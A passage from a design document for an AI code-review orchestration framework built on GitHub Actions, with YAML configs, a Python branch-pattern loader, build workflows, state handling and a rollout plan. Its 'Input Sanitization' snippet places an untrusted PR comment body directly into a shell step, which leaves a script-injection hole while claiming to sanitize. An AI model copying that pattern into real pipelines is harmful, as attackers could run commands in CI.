        ai_prompt: "performance-optimizer"
        ai_review: "iterative-code-review"
        max_iterations: 4
        auto_merge: false  # Performance changes require manual review
        scheduler:
          enabled: true
          interval: "24h"
          conditions: ["no_pending_prs", "benchmark_regression_detected"]
      work_discovery:
        enabled: true
        source: "performance_benchmarks"
        configuration:
          regression_threshold: "5%"
          target_improvement: "20%"

    feature_branches:
      pattern: "^feature/.*"
      priority: 50
      ai_behavior: "single-review"
      configuration:
        ai_prompt: "generic-code-review"
        timeout_minutes: 10
        cost_limit: "low"
      quality_gates: "feature"

    hotfix_branches:
      pattern: "^hotfix/.*"
      priority: 60
      ai_behavior: "expedited-review"
      configuration:
        ai_prompt: "security-focused-review"
        timeout_minutes: 15
        cost_limit: "medium"
        escalation_enabled: true
      quality_gates: "hotfix"

  # Cost control configuration
  cost_controls:
    limits:
      unlimited: 9999999
      high: 1000
      medium: 500
      low: 100
      very_low: 25
    monitoring:
      enabled: true
      alerts:
        threshold_warning: 80
        threshold_critical: 95

  # Quality gate definitions
  quality_gates:
    production:
      required_checks: ["build", "test", "security", "performance"]
      coverage_threshold: 90
      security_scan: true
      performance_baseline: true
    staging:
      required_checks: ["build", "test", "security"]
      coverage_threshold: 80
      security_scan: true
      performance_baseline: false
    feature:
      required_checks: ["build", "test"]
      coverage_threshold: 70
      security_scan: false
      performance_baseline: false
    hotfix:
      required_checks: ["build", "test", "security"]
      coverage_threshold: 60  # Lower threshold for urgent fixes
      security_scan: true
      performance_baseline: false

  # Fallback configuration
  default_configuration:
    ai_behavior: "generic-review"
    quality_gates: "feature"
    cost_limit: "low"
    timeout_minutes: 10
```

### 4.2 Python Configuration Loader

```python
# .github/scripts/config-loader.py
#!/usr/bin/env python3
"""AI Orchestration Configuration Loader"""

import yaml
import re
import sys
import json
import os
from typing import Dict, Any, Optional, List

class AIConfigurationLoader:
    def __init__(self, config_path: str = ".github/ai-orchestration-config.yml"):
        self.config_path = config_path
        self.config = self._load_config()

    def _load_config(self) -> Dict[str, Any]:
        """Load and validate configuration file"""
        try:
            if not os.path.exists(self.config_path):
                raise FileNotFoundError(f"Configuration file not found: {self.config_path}")

            with open(self.config_path, 'r') as f:
                config = yaml.safe_load(f)

            if 'ai_orchestration' not in config:
                raise ValueError("Missing 'ai_orchestration' root key")

            # Validate required sections
            ai_config = config['ai_orchestration']
            required_sections = ['branch_patterns', 'default_configuration']
            for section in required_sections:
                if section not in ai_config:
                    raise ValueError(f"Missing required section: {section}")

            return ai_config
        except Exception as e:
            print(f"‚ùå Error loading configuration: {e}")
            sys.exit(1)

    def resolve_branch_pattern(self, branch_name: str) -> Dict[str, Any]:
        """Resolve branch pattern to configuration"""
        branch_patterns = self.config.get('branch_patterns', {})

        # Sort patterns by priority (highest first)
        sorted_patterns = sorted(
            branch_patterns.items(),
            key=lambda x: x[1].get('priority', 0),
            reverse=True
        )

        # Match against patterns
        for pattern_name, pattern_config in sorted_patterns:
            pattern_regex = pattern_config.get('pattern', '')
            try:
                if re.match(pattern_regex, branch_name):
                    print(f"‚úÖ Matched pattern '{pattern_name}' for branch '{branch_name}'")
                    return self._merge_with_defaults(pattern_config)
            except re.error as e:
                print(f"‚ö†Ô∏è Invalid regex pattern '{pattern_regex}': {e}")
                continue

        # Fallback to default
        print(f"‚ö†Ô∏è No pattern matched for branch '{branch_name}', using default")
        return self.config.get('default_configuration', {})

    def _merge_with_defaults(self, pattern_config: Dict[str, Any]) -> Dict[str, Any]:
        """Merge pattern configuration with defaults"""
        defaults = self.config.get('default_configuration', {})
        merged = defaults.copy()
        merged.update(pattern_config)
        return merged

    def get_work_discovery_config(self, branch_name: str) -> Optional[Dict[str, Any]]:
        """Get work discovery configuration for a branch"""
        config = self.resolve_branch_pattern(branch_name)
        return config.get('work_discovery')

    def get_scheduler_config(self, branch_name: str) -> Optional[Dict[str, Any]]:
        """Get scheduler configuration for a branch"""
        config = self.resolve_branch_pattern(branch_name)
        ai_config = config.get('configuration', {})
        return ai_config.get('scheduler')

    def list_epic_branches_with_scheduler(self) -> List[str]:
        """List all branch patterns that have scheduler enabled"""
        patterns = []
        for pattern_name, pattern_config in self.config.get('branch_patterns', {}).items():
            scheduler_config = pattern_config.get('configuration', {}).get('scheduler', {})
            if scheduler_config.get('enabled', False):
                patterns.append(pattern_config.get('pattern', ''))
        return patterns

    def validate_configuration(self) -> bool:
        """Validate configuration syntax and logic"""
        try:
            # Check for duplicate priorities
            priorities = [
                config.get('priority', 0)
                for config in self.config.get('branch_patterns', {}).values()
            ]
            if len(priorities) != len(set(priorities)):
                print("‚ö†Ô∏è Warning: Duplicate priorities found in branch patterns")

            # Validate regex patterns
            for pattern_name, pattern_config in self.config.get('branch_patterns', {}).items():
                pattern_regex = pattern_config.get('pattern', '')
                try:
                    re.compile(pattern_regex)
                except re.error as e:
                    print(f"‚ùå Invalid regex in pattern '{pattern_name}': {e}")
                    return False

            # Validate cost limits
            cost_controls = self.config.get('cost_controls', {})
            valid_limits = set(cost_controls.get('limits', {}).keys())
            for pattern_name, pattern_config in self.config.get('branch_patterns', {}).items():
                cost_limit = pattern_config.get('configuration', {}).get('cost_limit')
                if cost_limit and cost_limit not in valid_limits:
                    print(f"‚ùå Invalid cost limit '{cost_limit}' in pattern '{pattern_name}'")
                    return False

            print("‚úÖ Configuration validation passed")
            return True
        except Exception as e:
            print(f"‚ùå Configuration validation failed: {e}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: config-loader.py <command> [branch_name]")
        print("Commands:")
        print("  resolve <branch_name>    - Resolve configuration for branch")
        print("  validate                 - Validate configuration syntax")
        print("  list-epic-schedulers     - List epic patterns with scheduler enabled")
        sys.exit(1)

    command = sys.argv[1]
    loader = AIConfigurationLoader()

    if command == "resolve":
        if len(sys.argv) != 3:
            print("Usage: config-loader.py resolve <branch_name>")
            sys.exit(1)

        branch_name = sys.argv[2]
        config = loader.resolve_branch_pattern(branch_name)
        print(json.dumps(config, indent=2))

    elif command == "validate":
        if loader.validate_configuration():
            sys.exit(0)
        else:
            sys.exit(1)

    elif command == "list-epic-schedulers":
        patterns = loader.list_epic_branches_with_scheduler()
        print(json.dumps(patterns, indent=2))

    else:
        print(f"Unknown command: {command}")
        sys.exit(1)
```

### 4.3 Branch Pattern Matching Logic

**Pattern Matching Algorithm:**
1. Load all branch patterns with priorities
2. Sort patterns by priority (highest first)
3. Test branch name against each pattern regex
4. Return first match, or default configuration
5. Merge pattern-specific config with defaults

**Usage in Workflows:**
```yaml
- name: Resolve AI configuration
  id: config-resolution
  run: |
    echo "üîß Resolving AI configuration for branch: ${{ github.ref_name }}"

    CONFIG_JSON=$(python3 .github/scripts/config-loader.py resolve "${{ github.ref_name }}")

    # Extract key configuration values
    AI_BEHAVIOR=$(echo "$CONFIG_JSON" | jq -r '.ai_behavior // "generic-review"')
    QUALITY_GATES=$(echo "$CONFIG_JSON" | jq -r '.quality_gates // "feature"')
    COST_LIMIT=$(echo "$CONFIG_JSON" | jq -r '.configuration.cost_limit // "low"')

    echo "ai_behavior=$AI_BEHAVIOR" >> $GITHUB_OUTPUT
    echo "quality_gates=$QUALITY_GATES" >> $GITHUB_OUTPUT
    echo "cost_limit=$COST_LIMIT" >> $GITHUB_OUTPUT

    echo "‚úÖ Configuration resolved: $AI_BEHAVIOR with $QUALITY_GATES quality gates"
```

### 4.4 Dynamic Behavior Selection

**AI Behavior Mapping:**
```yaml
ai_behaviors:
  5-sentinel-suite:
    actions:
      - ai-sentinel-base
      - ai-testing-analysis
      - ai-standards-analysis
      - ai-security-analysis
      - merge-orchestrator-analysis
    timeout: 30

  iterative-autonomous:
    actions:
      - iterative-ai-review
      - autonomous-pr-management
    timeout: 25

  single-review:
    actions:
      - ai-sentinel-base
    timeout: 10

  expedited-review:
    actions:
      - ai-security-analysis
      - ai-standards-analysis
    timeout: 15
```

## 5. Universal Build Workflow Architecture

### 5.1 Foundation Pipeline Components

```yaml
# .github/workflows/universal-build.yml
name: Universal Build Pipeline

on:
  push:
    branches: ['**']
  pull_request:
    branches: ['**']
  workflow_call:
    inputs:
      branch_pattern:
        required: true
        type: string
      operation_mode:
        required: true
        type: string  # 'mission', 'review', 'standard'
      ai_config_override:
        required: false
        type: string

permissions:
  contents: read
  actions: write
  pull-requests: write
  id-token: write

jobs:
  configuration-loading:
    name: AI Configuration Loading
    runs-on: ubuntu-latest
    timeout-minutes: 2
    outputs:
      ai_behavior: ${{ steps.config-resolution.outputs.ai_behavior }}
      quality_gates: ${{ steps.config-resolution.outputs.quality_gates }}
      cost_limits: ${{ steps.config-resolution.outputs.cost_limits }}
      work_discovery: ${{ steps.config-resolution.outputs.work_discovery }}
      ai_enabled: ${{ steps.config-resolution.outputs.ai_enabled }}

    steps:
      - name: Checkout configuration
        uses: actions/checkout@v4
        with:
          sparse-checkout: |
            .github/ai-orchestration-config.yml
            .github/scripts/config-loader.py
          sparse-checkout-cone-mode: false

      - name: Resolve AI configuration
        id: config-resolution
        run: |
          echo "üîß Resolving AI configuration for branch pattern..."

          # Determine branch name
          BRANCH_NAME="${{ github.ref_name }}"
          if [[ -n "${{ inputs.branch_pattern }}" ]]; then
            BRANCH_NAME="${{ inputs.branch_pattern }}"
          fi

          echo "Analyzing branch: $BRANCH_NAME"

          # Load configuration
          if [[ -f ".github/scripts/config-loader.py" ]]; then
            CONFIG_JSON=$(python3 .github/scripts/config-loader.py resolve "$BRANCH_NAME")

            # Extract configuration values
            AI_BEHAVIOR=$(echo "$CONFIG_JSON" | jq -r '.ai_behavior // "none"')
            QUALITY_GATES=$(echo "$CONFIG_JSON" | jq -r '.quality_gates // "basic"')
            COST_LIMIT=$(echo "$CONFIG_JSON" | jq -r '.configuration.cost_limit // "low"')

            # Determine if AI is enabled for this branch
            if [[ "$AI_BEHAVIOR" != "none" && "$AI_BEHAVIOR" != "null" ]]; then
              AI_ENABLED="true"
            else
              AI_ENABLED="false"
            fi
          else
            echo "‚ö†Ô∏è Configuration loader not found, using defaults"
            AI_BEHAVIOR="generic-review"
            QUALITY_GATES="basic"
            COST_LIMIT="low"
            AI_ENABLED="true"
          fi

          echo "ai_behavior=$AI_BEHAVIOR" >> $GITHUB_OUTPUT
          echo "quality_gates=$QUALITY_GATES" >> $GITHUB_OUTPUT
          echo "cost_limits=$COST_LIMIT" >> $GITHUB_OUTPUT
          echo "ai_enabled=$AI_ENABLED" >> $GITHUB_OUTPUT

          echo "‚úÖ Configuration resolved: $AI_BEHAVIOR (AI: $AI_ENABLED)"

  foundation-execution:
    name: Foundation Pipeline
    needs: [configuration-loading]
    runs-on: ubuntu-latest
    timeout-minutes: 25
    outputs:
      foundation_success: ${{ steps.foundation-summary.outputs.success }}
      build_artifacts: ${{ steps.foundation-summary.outputs.artifacts }}
      has_backend_changes: ${{ steps.path-analysis.outputs.has_backend_changes }}
      has_frontend_changes: ${{ steps.path-analysis.outputs.has_frontend_changes }}
      change_summary: ${{ steps.path-analysis.outputs.change_summary }}

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Foundation - Setup Environment
        id: environment-setup
        uses: ./.github/actions/shared/setup-environment
        with:
          dotnet_version: '8.0'
          node_version: '20'

      - name: Foundation - Path Analysis
        id: path-analysis
        uses: ./.github/actions/shared/path-analysis
        with:
          base_ref: ${{ github.event.pull_request.base.sha || github.event.before }}

      - name: Foundation - Backend Build
        id: backend-build
        if: steps.path-analysis.outputs.has_backend_changes == 'true'
        uses: ./.github/actions/shared/backend-build
        with:
          solution_path: 'zarichney-api.sln'
          coverage_enabled: true
          configuration: 'Release'
          continue_on_error: ${{ inputs.operation_mode == 'mission' }}

      - name: Foundation - Frontend Build
        id: frontend-build
        if: steps.path-analysis.outputs.has_frontend_changes == 'true'
        uses: ./.github/actions/shared/frontend-build
        with:
          project_path: 'Code/Zarichney.Website'
          build_configuration: 'production'
          continue_on_error: ${{ inputs.operation_mode == 'mission' }}

      - name: Foundation Summary
        id: foundation-summary
        run: |
          BACKEND_SUCCESS="${{ steps.backend-build.outputs.build_success || 'true' }}"
          FRONTEND_SUCCESS="${{ steps.frontend-build.outputs.build_success || 'true' }}"

          if [[ "$BACKEND_SUCCESS" == "true" && "$FRONTEND_SUCCESS" == "true" ]]; then
            FOUNDATION_SUCCESS="true"
          else
            FOUNDATION_SUCCESS="false"
          fi

          echo "success=$FOUNDATION_SUCCESS" >> $GITHUB_OUTPUT
          echo "artifacts=foundation-artifacts" >> $GITHUB_OUTPUT
          echo "üìä Foundation execution complete: $FOUNDATION_SUCCESS"

  conditional-ai-integration:
    name: AI Integration Layer
    needs: [configuration-loading, foundation-execution]
    if: |
      always() && !cancelled() &&
      needs.configuration-loading.outputs.ai_enabled == 'true' &&
      (inputs.operation_mode != 'mission' || needs.foundation-execution.outputs.foundation_success == 'true')
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Initialize AI components
        run: |
          AI_BEHAVIOR="${{ needs.configuration-loading.outputs.ai_behavior }}"
          OPERATION_MODE="${{ inputs.operation_mode }}"

          echo "ü§ñ Initializing AI integration: $AI_BEHAVIOR (Mode: $OPERATION_MODE)"

          # AI component initialization based on configuration
          case "$AI_BEHAVIOR" in
            "5-sentinel-suite")
              echo "‚úÖ Initializing full 5-sentinel suite"
              echo "ai_components=5-sentinel-suite" >> $GITHUB_ENV
              ;;
            "4-sentinel-suite")
              echo "‚úÖ Initializing 4-sentinel suite (no security)"
              echo "ai_components=4-sentinel-suite" >> $GITHUB_ENV
              ;;
            "iterative-autonomous")
              echo "‚úÖ Initializing iterative autonomous AI agent"
              echo "ai_components=iterative-autonomous" >> $GITHUB_ENV
              ;;
            "single-review")
              echo "‚úÖ Initializing single review agent"
              echo "ai_components=single-review" >> $GITHUB_ENV
              ;;
            "expedited-review")
              echo "‚úÖ Initializing expedited review for hotfix"
              echo "ai_components=expedited-review" >> $GITHUB_ENV
              ;;
            *)
              echo "‚ùå Unknown AI behavior: $AI_BEHAVIOR"
              exit 1
              ;;
          esac

      - name: Execute AI workflow dispatch
        run: |
          AI_COMPONENTS="${{ env.ai_components }}"
          OPERATION_MODE="${{ inputs.operation_mode }}"

          echo "üöÄ Dispatching AI workflow: $AI_COMPONENTS"

          # Determine appropriate AI workflow based on components and mode
          case "$AI_COMPONENTS" in
            "5-sentinel-suite"|"4-sentinel-suite")
              if [[ "$OPERATION_MODE" == "review" ]]; then
                WORKFLOW="ai-sentinel-review.yml"
              else
                WORKFLOW="ai-sentinel-analysis.yml"
              fi
              ;;
            "iterative-autonomous")
              WORKFLOW="ai-iterative-review.yml"
              ;;
            "single-review"|"expedited-review")
              WORKFLOW="ai-simple-review.yml"
              ;;
          esac

          gh workflow run "$WORKFLOW" \
            --field "trigger_context=universal-build" \
            --field "foundation_status=${{ needs.foundation-execution.outputs.foundation_success }}" \
            --field "change_summary=${{ needs.foundation-execution.outputs.change_summary }}" \
            --field "quality_gates=${{ needs.configuration-loading.outputs.quality_gates }}"

          echo "‚úÖ AI workflow dispatched: $WORKFLOW"
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  operation-aware-blocking:
    name: Operation-Aware Quality Gates
    needs: [configuration-loading, foundation-execution, conditional-ai-integration]
    if: always() && !cancelled()
    runs-on: ubuntu-latest
    timeout-minutes: 5

    steps:
      - name: Evaluate operation-specific quality gates
        run: |
          OPERATION_MODE="${{ inputs.operation_mode }}"
          FOUNDATION_SUCCESS="${{ needs.foundation-execution.outputs.foundation_success }}"
          AI_ENABLED="${{ needs.configuration-loading.outputs.ai_enabled }}"
          QUALITY_GATES="${{ needs.configuration-loading.outputs.quality_gates }}"

          echo "üìä Operation-Aware Quality Gate Evaluation"
          echo "Operation Mode: $OPERATION_MODE"
          echo "Foundation Success: $FOUNDATION_SUCCESS"
          echo "AI Enabled: $AI_ENABLED"
          echo "Quality Gates: $QUALITY_GATES"

          # Determine blocking behavior based on operation mode
          case "$OPERATION_MODE" in
            "standard")
              # Standard pushes - require foundation success
              if [[ "$FOUNDATION_SUCCESS" == "true" ]]; then
                echo "‚úÖ Standard build quality gates: PASSED"
                exit 0
              else
                echo "‚ùå Standard build quality gates: FAILED"
                exit 1
              fi
              ;;
            "review")
              # PR review mode - strict blocking
              if [[ "$FOUNDATION_SUCCESS" == "true" ]]; then
                echo "‚úÖ Review quality gates: PASSED"
                exit 0
              else
                echo "‚ùå Review quality gates: FAILED - blocking PR"
                exit 1
              fi
              ;;
            "mission")
              # AI mission mode - non-blocking for scheduled operations
              echo "‚úÖ Mission quality gates: NON-BLOCKING (context collection mode)"
              exit 0
              ;;
            *)
              echo "‚ö†Ô∏è Unknown operation mode: $OPERATION_MODE"
              exit 0
              ;;
          esac
```

### 5.2 Conditional AI Integration

**AI Integration Decision Logic:**
```yaml
if: |
  always() && !cancelled() &&
  needs.configuration-loading.outputs.ai_enabled == 'true' &&
  (inputs.operation_mode != 'mission' || needs.foundation-execution.outputs.foundation_success == 'true')
```

**AI Component Initialization:**
```bash
case "$AI_BEHAVIOR" in
  "5-sentinel-suite")
    echo "‚úÖ Initializing full 5-sentinel suite"
    echo "ai_components=5-sentinel-suite" >> $GITHUB_ENV
    ;;
  "iterative-autonomous")
    echo "‚úÖ Initializing iterative autonomous AI agent"
    echo "ai_components=iterative-autonomous" >> $GITHUB_ENV
    ;;
  # ... additional cases
esac
```

### 5.3 Quality Gate Enforcement

**Operation-Aware Blocking:**
- **Standard Mode:** Require foundation success
- **Review Mode:** Strict blocking on any failure
- **Mission Mode:** Non-blocking (context collection)

**Quality Gate Configuration:**
```yaml
quality_gates:
  production:
    required_checks: ["build", "test", "security", "performance"]
    coverage_threshold: 90
  staging:
    required_checks: ["build", "test", "security"]
    coverage_threshold: 80
  feature:
    required_checks: ["build", "test"]
    coverage_threshold: 70
```

## 6. Storage and State Management

### 6.1 Artifact-Based Storage Strategy

**Mission Artifact Structure:**
```yaml
artifacts:
  mission_state:
    - diagnostic_context.json
    - mission_progress.json
    - ai_decisions.json
  foundation_results:
    - TestResults/
    - CoverageReport/
    - BuildLogs/
  ai_outputs:
    - code_changes/
    - review_comments/
    - improvement_suggestions/
```

**Cross-Mission State Persistence:**
```yaml
- name: Store mission state
  uses: actions/upload-artifact@v4
  with:
    name: mission-state-${{ inputs.target_branch }}-${{ github.run_number }}
    path: |
      mission_state.json
      ai_context/
    retention-days: 30

- name: Restore previous mission state
  if: inputs.mission_mode == 'resume'
  uses: actions/download-artifact@v4
  with:
    name: mission-state-${{ inputs.target_branch }}-${{ inputs.previous_run_number }}
    path: previous_state/
```

### 6.2 Cross-Workflow State Persistence

**GitHub API Integration for State Management:**
```python
# .github/scripts/state-manager.py
import json
import os
from github import Github
from typing import Dict, Any, Optional

class WorkflowStateManager:
    def __init__(self, github_token: str, repo_name: str):
        self.github = Github(github_token)
        self.repo = self.github.get_repo(repo_name)

    def store_mission_state(self, branch: str, state: Dict[str, Any]) -> str:
        """Store mission state in repository variables"""
        variable_name = f"MISSION_STATE_{branch.replace('/', '_').upper()}"

        # GitHub repository variables have size limits, so compress if needed
        state_json = json.dumps(state, separators=(',', ':'))

        try:
            # Try to update existing variable
            var = self.repo.get_variable(variable_name)
            self.repo.edit_variable(variable_name, state_json)
        except:
            # Create new variable
            self.repo.create_variable(variable_name, state_json)

        return variable_name

    def retrieve_mission_state(self, branch: str) -> Optional[Dict[str, Any]]:
        """Retrieve mission state from repository variables"""
        variable_name = f"MISSION_STATE_{branch.replace('/', '_').upper()}"

        try:
            var = self.repo.get_variable(variable_name)
            return json.loads(var.value)
        except:
            return None

    def cleanup_old_states(self, max_age_days: int = 7):
        """Clean up old mission state variables"""
        # Implementation for cleaning up old state variables
        pass
```

**Usage in Workflows:**
```yaml
- name: Store mission state
  run: |
    python3 << 'EOF'
    from github_scripts.state_manager import WorkflowStateManager
    import json

    state = {
        "mission_type": "${{ inputs.mission_type }}",
        "last_run": "${{ github.run_number }}",
        "foundation_status": "${{ steps.foundation.outputs.success }}",
        "ai_progress": "${{ steps.ai-execution.outputs.progress }}",
        "next_actions": ["coverage_analysis", "test_generation"]
    }

    manager = WorkflowStateManager("${{ secrets.GITHUB_TOKEN }}", "${{ github.repository }}")
    variable_name = manager.store_mission_state("${{ inputs.target_branch }}", state)
    print(f"State stored in variable: {variable_name}")
    EOF
```

### 6.3 GitHub API Integration Patterns

**Repository Variable Management:**
```bash
# Store state as repository variable
gh variable set "MISSION_STATE_EPIC_COVERAGE" --body "{\"status\":\"active\",\"progress\":75}"

# Retrieve state
MISSION_STATE=$(gh variable get "MISSION_STATE_EPIC_COVERAGE")

# List all mission states
gh variable list | grep "MISSION_STATE_"
```

**PR State Synchronization:**
```yaml
- name: Synchronize PR state
  uses: actions/github-script@v7
  with:
    script: |
      // Update PR description with mission progress
      const missionState = JSON.parse(process.env.MISSION_STATE);

      const progressTable = `
      ## ü§ñ AI Mission Progress

      | Metric | Value |
      |--------|-------|
      | Coverage Baseline | ${missionState.coverage_baseline}% |
      | Current Coverage | ${missionState.current_coverage}% |
      | Target Coverage | ${missionState.target_coverage}% |
      | Tests Added | ${missionState.tests_added} |
      | Last Update | ${new Date().toISOString()} |
      `;

      await github.rest.pulls.update({
        owner: context.repo.owner,
        repo: context.repo.repo,
        pull_number: context.issue.number,
        body: progressTable
      });
```

## 7. Risk Assessment and Mitigation

### 7.1 Infrastructure Gaps

#### 7.1.1 Critical Dependencies

**Issue #220: Coverage Epic Merge Orchestrator (BLOCKING)**
- **Impact:** Phase 5 merge orchestration cannot function without AI conflict resolution
- **Risk Level:** HIGH - Blocks multi-PR consolidation workflows
- **Mitigation:**
  - Prioritize Issue #220 resolution before full framework deployment
  - Implement fallback manual merge process for interim period
  - Develop comprehensive testing for AI conflict resolution

**AI Configuration Registry**
- **Gap:** Dynamic branch pattern matching system not implemented
- **Risk Level:** MEDIUM - Manual configuration burden
- **Mitigation:**
  - Implement configuration loader with comprehensive validation
  - Create extensive test suite for pattern matching
  - Provide clear migration path from existing workflows

**Work Discovery Adapters**
- **Gap:** Pluggable work source interfaces not fully defined
- **Risk Level:** MEDIUM - Limited scalability to new workstreams
- **Mitigation:**
  - Define adapter interface specification
  - Implement coverage and static analysis adapters first
  - Plan for extensibility to security scans, performance metrics

### 7.2 AI Service Reliability

**OpenAI API Dependency:**
```yaml
ai_reliability_mitigations:
  retry_logic:
    max_attempts: 3
    backoff_strategy: "exponential"
    base_delay: 30
  fallback_strategies:
    - basic_static_analysis
    - human_review_notification
    - graceful_degradation
  error_handling:
    - comprehensive_logging
    - failure_classification
    - escalation_procedures
```

**Service Health Monitoring:**
```yaml
- name: AI Service Health Check
  run: |
    echo "üè• Checking AI service availability..."

    # Test OpenAI API connection
    curl -s -H "Authorization: Bearer ${{ secrets.OPENAI_API_KEY }}" \
         "https://api.openai.com/v1/models" > /dev/null

    if [[ $? -eq 0 ]]; then
      echo "‚úÖ OpenAI API: HEALTHY"
      echo "ai_service_healthy=true" >> $GITHUB_OUTPUT
    else
      echo "‚ùå OpenAI API: UNAVAILABLE"
      echo "ai_service_healthy=false" >> $GITHUB_OUTPUT
    fi
```

### 7.3 Resource Management

**GitHub Actions Quota Management:**
```yaml
concurrency:
  group: ai-operations-global
  cancel-in-progress: false

strategy:
  matrix:
    mission: ${{ fromJson(needs.discovery.outputs.missions) }}
  fail-fast: false
  max-parallel: 2  # Prevent resource exhaustion
```

**Cost Control Implementation:**
```yaml
- name: Cost monitoring check
  run: |
    COST_LIMIT="${{ needs.config.outputs.cost_limit }}"
    CURRENT_USAGE=$(curl -s "https://api.example.com/cost-tracking" | jq .current_usage)

    case "$COST_LIMIT" in
      "low")
        LIMIT=100
        ;;
      "medium")
        LIMIT=500
        ;;
      "high")
        LIMIT=1000
        ;;
      *)
        LIMIT=50  # Very conservative default
        ;;
    esac

    if [[ $CURRENT_USAGE -gt $LIMIT ]]; then
      echo "‚ùå Cost limit exceeded: $CURRENT_USAGE > $LIMIT"
      exit 1
    fi

    echo "‚úÖ Cost within limits: $CURRENT_USAGE / $LIMIT"
```

### 7.4 Operational Risks

**Mission Workflow Failure Recovery:**
```yaml
- name: Mission failure recovery
  if: failure()
  run: |
    echo "üö® Mission failure detected - initiating recovery procedures"

    # Store failure context for analysis
    cat > failure_context.json << EOF
    {
      "mission_type": "${{ inputs.mission_type }}",
      "failure_step": "${{ github.job }}",
      "error_logs": "${{ steps.previous-step.outputs.error_log }}",
      "foundation_status": "${{ steps.foundation.outputs.success }}",
      "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    }
    EOF

    # Notify team of mission failure
    gh issue comment ${{ github.event.issue.number }} \
      --body "üö® AI Mission failed. See failure_context artifact for details."

    # Schedule retry for next orchestration cycle
    echo "mission_retry_needed=true" >> $GITHUB_OUTPUT
```

**PR Draft State Recovery:**
```yaml
- name: PR state recovery check
  if: always()
  uses: actions/github-script@v7
  with:
    script: |
      // Check if PR is stuck in draft due to transient failures
      const pr = context.payload.pull_request;
      if (pr.draft) {
        const comments = await github.rest.issues.listComments({
          owner: context.repo.owner,
          repo: context.repo.repo,
          issue_number: pr.number
        });

        const automatedFailure = comments.data.some(comment =>
          comment.body.includes('Foundation Validation Failed') &&
          comment.created_at > new Date(Date.now() - 3600000) // Within last hour
        );

        if (automatedFailure) {
          // Provide manual override option
          await github.rest.issues.createComment({
            owner: context.repo.owner,
            repo: context.repo.repo,
            issue_number: pr.number,
            body: `## ‚ö†Ô∏è Manual Override Available

            This PR was automatically marked as draft due to foundation failures.
            If you believe this is a transient issue, you can:

            1. Comment with \`/ai-review-override\` to force AI review
            2. Mark PR as ready for review to re-trigger validation

            *Last automated check: ${new Date().toISOString()}*`
          });
        }
      }
```

### 7.5 Security Considerations

**AI Framework Security Boundaries:**
```yaml
permissions:
  contents: read        # Minimal read access
  actions: write        # Workflow dispatch only
  pull-requests: write  # Comment and label management
  id-token: write       # OIDC token for secure authentication
  # Explicitly exclude:
  # - issues: write
  # - packages: write
  # - deployments: write
```

**Input Sanitization:**
```bash
# Sanitize user inputs for AI consumption
sanitize_input() {
  local input="$1"
  # Remove potentially dangerous characters
  echo "$input" | sed 's/[<>&"|`$\\]//g' | tr -d '\0'
}

USER_INPUT=$(sanitize_input "${{ github.event.comment.body }}")
```

**Token Scope Validation:**
```yaml
- name: Validate token permissions
  run: |
    echo "üîê Validating GitHub token permissions..."

    # Test required permissions
    gh api user --silent
    gh api repos/${{ github.repository }}/actions/workflows --silent
    gh api repos/${{ github.repository }}/pulls --silent

    echo "‚úÖ Token permissions validated"
```

## 8. Implementation Roadmap

### 8.1 Phase 1: Core Infrastructure (Weeks 1-2)

#### Week 1: Configuration Foundation
**Day 1-2: AI Configuration Registry**
```bash
# Implementation tasks
1. Create .github/ai-orchestration-config.yml with full branch patterns
2. Implement Python configuration loader with validation
3. Add comprehensive test suite for pattern matching
4. Document configuration schema and usage patterns

# Deliverables
- ai-orchestration-config.yml
- config-loader.py with validation
- test_config_loader.py
- README-ai-configuration.md
```

**Day 3-4: Mission Workflow Templates**
```bash
# Implementation tasks
1. Create ai-mission-coverage.yml with complete workflow
2. Implement tech debt and performance mission templates
3. Test non-blocking philosophy with diagnostic collection
4. Validate artifact publishing and retention

# Deliverables
- ai-mission-coverage.yml
- ai-mission-tech-debt.yml
- ai-mission-performance.yml
- Mission workflow testing documentation
```

**Day 5-7: Integration Testing**
```bash
# Testing focus
1. Configuration loader accuracy testing
2. Mission workflow dry-run validation
3. Artifact storage and retrieval testing
4. Error handling and failure scenarios

# Validation criteria
- 100% pattern matching accuracy
- Mission workflows execute without errors
- Artifacts persist across workflow runs
- Graceful failure handling verified
```

#### Week 2: Scheduler Implementation
**Day 8-10: Default-Branch Scheduler**
```bash
# Implementation tasks
1. Create ai-orchestration-scheduler.yml
2. Implement branch discovery and PR detection
3. Add mission matrix generation and dispatch
4. Test scheduled trigger functionality

# Deliverables
- ai-orchestration-scheduler.yml
- GitHub CLI integration patterns
- Mission dispatch logic
- Scheduler health monitoring
```

**Day 11-12: Review Workflow Enhancement**
```bash
# Implementation tasks
1. Implement foundation validation blocking
2. Create quality gate enforcement mechanisms
3. Add draft PR management functionality
4. Test automatic state management

# Deliverables
- ai-review-epic.yml
- Foundation validation workflows
- Quality gate implementation
- PR state management scripts
```

**Day 13-14: Integration and Validation**
```bash
# End-to-end testing
1. Scheduler triggers mission workflows correctly
2. Review workflows block appropriately on failures
3. Cross-workflow state persistence functions
4. All GitHub API integrations work correctly

# Success criteria
- Scheduler discovers and dispatches missions
- Review workflows enforce quality gates
- State persists across workflow executions
- No GitHub API rate limit issues
```

### 8.2 Phase 2: Universal Pipeline (Weeks 3-4)

#### Week 3: Foundation Pipeline Consolidation
**Day 15-17: Universal Build Workflow Base**
```bash
# Implementation tasks
1. Create universal-build.yml with operation modes
2. Implement conditional AI integration layer
3. Add operation-aware quality gate enforcement
4. Test cross-branch compatibility

# Deliverables
- universal-build.yml
- Operation mode handling
- Conditional AI integration
- Quality gate matrix
```

**Day 18-19: AI Integration Layer**
```bash
# Implementation tasks
1. Dynamic AI component initialization
2. Workflow dispatch based on configuration
3. AI behavior mapping implementation
4. Cost control integration

# Deliverables
- AI component initialization logic
- Dynamic workflow dispatch
- Behavior mapping configuration
- Cost monitoring implementation
```

**Day 20-21: Foundation Integration**
```bash
# Testing and validation
1. Universal pipeline handles all branch types
2. AI integration adapts to configuration
3. Quality gates enforce appropriately
4. Resource usage within limits

# Success criteria
- Single pipeline supports all workflows
- AI integration seamless and configurable
- Quality gates appropriate for branch type
- Resource usage monitored and controlled
```

#### Week 4: Work Discovery Implementation
**Day 22-24: Work Discovery Adapters**
```bash
# Implementation tasks
